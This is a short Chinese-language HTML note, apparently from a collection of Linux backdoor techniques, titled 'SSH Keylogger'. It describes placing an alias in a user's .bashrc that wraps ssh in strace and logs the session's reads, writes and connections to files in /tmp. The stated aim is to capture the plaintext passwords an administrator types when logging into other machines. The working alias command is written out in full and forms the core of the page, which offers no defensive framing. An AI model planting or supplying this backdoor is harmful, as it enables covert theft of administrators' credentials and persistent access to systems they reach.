	<body>
		<h1 class="csAD577193">
			<a name="ssh-keylogger"><span class="csDE05BCC">SSH Keylogger</span></a></h1>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">利用</span><span class="cs8926E06">strace</span><span class="cs9C1B1871">系统调试工具获取</span><span class="cs8926E06">ssh</span><span class="cs9C1B1871">的读写连接的数据，以达到抓取管理员登陆其他机器的明文密码的作用。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">在当前用户的</span><span class="cs8926E06">.bashrc</span><span class="cs9C1B1871">里新建一条</span><span class="cs8926E06">alias</span><span class="cs9C1B1871">、这样可以抓取他登陆其他机器的</span><span class="cs8926E06">ssh</span><span class="cs9C1B1871">密码。算是</span><span class="cs8926E06">alias</span><span class="cs9C1B1871">后门。后面会在讲一下</span><span class="cs8926E06">alias</span><span class="cs9C1B1871">后门。</span></p><p class="cs3A447A38"><span class="cs9FB05234">alias ssh=&#39;strace -o /tmp/sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s2048 ssh&#39;</span></p><p class="cs40DD2BC9"><span><img src="安全技术/Linux后门/SSH后门/SSH%20Keylogger%20_files/image0.png" width="560" height="193" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">&nbsp;</span></p></body>
